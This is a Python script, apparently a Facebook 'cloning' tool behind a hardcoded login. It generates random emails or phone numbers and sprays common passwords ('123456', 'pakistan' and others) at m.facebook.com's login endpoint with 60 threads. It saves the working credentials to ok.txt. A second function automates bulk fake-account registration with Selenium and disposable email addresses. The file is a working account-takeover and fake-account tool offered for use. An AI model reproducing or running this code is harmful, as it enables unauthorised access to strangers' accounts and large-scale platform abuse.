import os, sys, time, random, re
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    os.system('pip install requests selenium webdriver-manager')
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- LOGIN (basitsultan / basitprince) ---
def login():
    os.system('clear')
    print("\033[1;92m====================================")
    print("\033[1;93m      BASIT SYCO UNIVERSAL PRO")
    print("\033[1;92m====================================")
    user = input("\033[1;37m[+] Username: ")
    pas = input("\033[1;37m[+] Password: ")
    if user == "basitsultan" and pas == "basitprince":
        print("\033[1;92m\n[!] Login Success! Access Granted."); time.sleep(2); menu()
    else:
        print("\033[1;31m\n[!] Access Denied!"); time.sleep(2); login()

# --- UNIVERSAL CLONING (Numbers & All Mails) ---
def universal_cloner():
    os.system('clear')
    print("\033[1;32m--- UNIVERSAL CLONING (WORLDWIDE) ---")
    print("[1] Crack Emails (Gmail/Yahoo/Hotmail/Temp)")
    print("[2] Crack Mobile Numbers (Global)")
    
    choice = input("\nSelect: ")
    targets = []
    
    if choice == '1':
        keyword = input("Enter Name/Keyword: ")
        limit = int(input("How many IDs to generate?: "))
        domains = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@mail7.io"]
        for _ in range(limit):
            targets.append(keyword + str(random.randint(10, 9999)) + random.choice(domains))
    else:
        code = input("Enter Country/Network Code: ")
        limit = int(input("How many IDs?: "))
        for _ in range(limit):
            targets.append(code + "".join(random.choices("0123456789", k=7)))

    print(f"\n\033[1;94m[*] Cracking {len(targets)} Targets... (Fast Mode)")
    with ThreadPool(max_workers=60) as pool:
        for user in targets:
            # Universal Passwords (Har jagah kaam karte hain)
            p_list = ["123456", "12345678", "786786", "pakistan", "password", "i love you"]
            pool.submit(crack_engine, user, p_list)
    print("\n\033[1;92m[!] Done. Check ok.txt")

def crack_engine(user, p_list):
    for pas in p_list:
        try:
            session = requests.Session()
            head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'}
            res = session.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pas}, headers=head)
            if "c_user" in session.cookies.get_dict():
                print(f"\r\033[1;92m[OK] {user} | {pas}")
                open('ok.txt', 'a').write(user+'|'+pas+'\n'); break
        except: pass

# --- REAL ID CREATION (PC SELENIUM) ---
def auto_create():
    os.system('clear')
    print("\033[1;92m--- AUTO ID CREATOR (100% SUCCESS) ---")
    num_ids = int(input("Total IDs to create?: "))
    user_pass = input("Fixed Password for all: ")
    
    options = webdriver.ChromeOptions()
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    for i in range(num_ids):
        f_name = random.choice(["Alex", "John", "Sarah", "Emma", "Mike"])
        l_name = random.choice(["Smith", "Jones", "Wilson", "Brown"])
        email = f_name.lower() + str(random.randint(100,999)) + "@mail7.io"
        
        driver.get("https://m.facebook.com/reg/")
        time.sleep(5)
        driver.find_element(By.NAME, "firstname").send_keys(f_name)
        driver.find_element(By.NAME, "lastname").send_keys(l_name)
        driver.find_element(By.NAME, "reg_email__").send_keys(email)
        driver.find_element(By.NAME, "reg_passwd__").send_keys(user_pass)
        print(f"[{i+1}] Detail Filled: {email}. Finish it on Browser!")
        time.sleep(15) 
    driver.quit()

def menu():
    os.system('clear')
    print("\033[1;32m  ____    _    ____ ___ _____   ______   ____ ___  ")
    print(" | __ )  / \  / ___|_ _|_   _| / ___\ \ / /  / _ \ ")
    print(" |  _ \ / _ \ \___ \| |  | |   \___ \\\\ V /| | | |")
    print(" | |_) / ___ \ ___) | |  | |    ___) || | | |_| |")
    print(" |____/_/   \_\____/___| |_|   |____/ |_|  \___/ ")
    print("\n\033[1;37m[1] Universal Cloning (All Emails/Numbers)")
    print("[2] Auto ID Creation (100% Real - PC Only)")
    print("[0] Exit")
    ch = input("\nSelect: ")
    if ch == '1': universal_cloner()
    elif ch == '2': auto_create()
    else: sys.exit()

if __name__ == "__main__":
    login()
